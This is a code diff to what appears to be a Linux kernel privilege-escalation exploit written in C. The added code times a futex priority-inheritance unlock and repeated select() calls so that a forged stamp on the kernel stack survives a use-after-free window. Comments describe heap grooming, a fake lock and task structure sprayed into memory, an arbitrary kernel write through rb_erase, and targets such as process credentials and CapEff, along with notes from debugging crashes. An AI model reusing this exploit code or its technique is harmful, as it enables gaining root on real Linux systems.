@@ -2456,12 +2456,121 @@ void do_pselect_fake_lock_route(void) {
         close(sfd);
       }
     }
+    if (env_flag("MODE4_JC2_LATE_MIDSTAMP", 0) && route_attempt == 1) {
+      /*
+       * WALK-SURVIVAL FIX (09-19, from the 13-KP loop forensics): the ghost
+       * page is on the kmalloc freelist from the 0-timeout select's kfree
+       * until the blocking select re-allocates it. With the mid-stamp done
+       * EARLY (waiter path in main.c), that freelist window spanned this
+       * whole route setup — prints, fsyncs, stage.txt writes, fd opens (the
+       * +4..40ms pre-select KPs): any competing same-size allocation steals
+       * the page and every later walk (unlock deboost, consumer punch) reads
+       * thief garbage → panic. Here all slow setup is already DONE: stamp →
+       * unlock-walk → blocking select run back-to-back, so the window is
+       * microseconds and the blocking select's own kmalloc (same-CPU LIFO)
+       * takes the page straight back and KEEPS it allocated through the
+       * punch. The ghost is then never on the freelist while any walk runs.
+       *
+       * OWNER-SETTLE YIELD (09-20, jc4-jc8 forensics): the unlock wakes the
+       * owner, whose futex_lock_pi continuation RE-LINKS the ghost's tree
+       * words with real kernel linkage. In the OLD flow that re-link landed
+       * during the slow setup and the blocking select's fdset copy then
+       * RE-STAMPED over it — the punch read OUR stamp and the erase wrote
+       * *(tgt)=value (writes landed; jc3i children died of guard, cred
+       * content aside). Back-to-back (jc4-jc8) the final stamp landed BEFORE
+       * the re-link, the re-link won, and the punch walked kernel linkage:
+       * every write missed (CapEff=0 on a live frozen child, boot_wrote=0,
+       * no guard-null). Fix: after the unlock, sched_yield-settle so the
+       * owner finishes re-linking BEFORE the blocking select re-stamps.
+       * Pure userspace yield loop — no syscalls, no allocations: the ghost
+       * sits on the CPU-local freelist with no SELF-inflicted theft (the
+       * original 10/13 KP class was our own print/fsync/open allocations).
+       * Punch must land AFTER the final stamp: use
+       * PSELECT_ROUTE_DELAY_USEC ≥ settle + setup + margin (60000 worked).
+       */
+      fd_set in2 = in, out2 = out, ex2 = ex;
+      struct timeval tv0 = {0, 0};
+      select(PSELECT_ROUTE_NFDS, &in2, &out2, &ex2, &tv0);
+      errno = 0;
+      /*
+       * PSELECT_LATE_UNLOCK=0 (jc9 follow-up): skip the unlock entirely.
+       * The punch's chain runs ghost → fake_lock → fake_task (spray page),
+       * never the real f_pi_chain tree, so the owner's post-unlock re-link
+       * buys nothing — and it (or the settle it needs) is exactly what
+       * destroys/steals the final stamp (jc4-9: every write missed, or the
+       * settle window got the page stolen). Roll-14 era landed writes with
+       * NO unlock at all. The owner stays blocked; process exit cleans it.
+       */
+      if (env_int_range("PSELECT_LATE_UNLOCK", 1, 0, 1)) {
+        futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+        errno = 0;
+        {
+          int settle_ms = env_int_range("PSELECT_SETTLE_MS", 35, 0, 200);
+          if (settle_ms > 0) {
+            struct timespec st0, stn;
+            clock_gettime(CLOCK_MONOTONIC, &st0);
+            for (;;) {
+              sched_yield();
+              clock_gettime(CLOCK_MONOTONIC, &stn);
+              long el = (stn.tv_sec - st0.tv_sec) * 1000L +
+                        (stn.tv_nsec - st0.tv_nsec) / 1000000L;
+              if (el >= settle_ms)
+                break;
+            }
+          }
+        }
+      }
+    }
     errno = 0;
     {
       struct timespec gs;
       clock_gettime(CLOCK_MONOTONIC, &gs);
       g_select_start_us = (long long)gs.tv_sec * 1000000LL +
                           gs.tv_nsec / 1000;
+    }
+    if (env_flag("MODE4_JC2_SPINSTAMP", 0) && route_attempt == 1) {
+      /*
+       * SPIN-STAMP THROUGH THE PUNCH (09-20, QEMU-proven root cause): one
+       * blocking select leaves the fdset stamp FROZEN on the waiter's
+       * kernel stack for the whole 60ms+ punch window — nested IRQ frames
+       * clobber the waiter overlay (rb_erase then reads FPSIMM/pt_regs
+       * junk at pi_right: `str x10,[x9]` faults at 0xffffffffc2b0a8e8,
+       * the jc10/jc11/QEMU panic). Instead: loop 0-timeout selects on the
+       * SAME fdsets — each re-copies the stamp (tear window = the ~µs
+       * copy); the ghost's tree/pi words are continuously fresh. The
+       * consumer's wchan guard still sees do_select on every iteration.
+       * Loop spans the punch window (~150ms), then fall through to the
+       * blocking select for the route-return bookkeeping (ret=2 path).
+       */
+      fd_set sin = in, sout = out, sex = ex;
+      struct timeval tv0 = {0, 0};
+      struct timespec sp0, spn;
+      clock_gettime(CLOCK_MONOTONIC, &sp0);
+      int iters = 0;
+      for (;;) {
+        /* select() is READ-MODIFY-WRITE: on return it copies the result
+         * sets back into the user fdsets, wiping the stamp (the first
+         * spin run died with waiter->lock=0 — a NULL deref in
+         * adjust_prio_chain — because iterations 2+ copied zeros).
+         * Rebuild the full ghost stamp before every select. */
+        prepare_pselect_fdsets(&sin, &sout, &sex);
+        /* every 8th iteration blocks 3ms so the consumer's wchan guard
+         * (3x /proc/<tid>/{syscall,wchan} sampler) can confirm do_select —
+         * a pure tv=0 spin is in do_select for ~µs and is never sampled
+         * (jc spin test: 695 re-stamps, guard SKIPped, no punch). 3ms is
+         * far below the 60ms+ clobber window that killed the frozen
+         * single-stamp flow. */
+        struct timeval tvit = {0, (iters % 8 == 4) ? 3000 : 0};
+        select(PSELECT_ROUTE_NFDS, &sin, &sout, &sex, &tvit);
+        iters++;
+        clock_gettime(CLOCK_MONOTONIC, &spn);
+        long el = (spn.tv_sec - sp0.tv_sec) * 1000000L +
+                  (spn.tv_nsec - sp0.tv_nsec) / 1000;
+        if (el >= 150000L)
+          break;
+      }
+      pr_info("JC2 SPINSTAMP: %d re-stamps over punch window\n", iters);
+      errno = 0;
     }
     int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
     int saved_errno = errno;
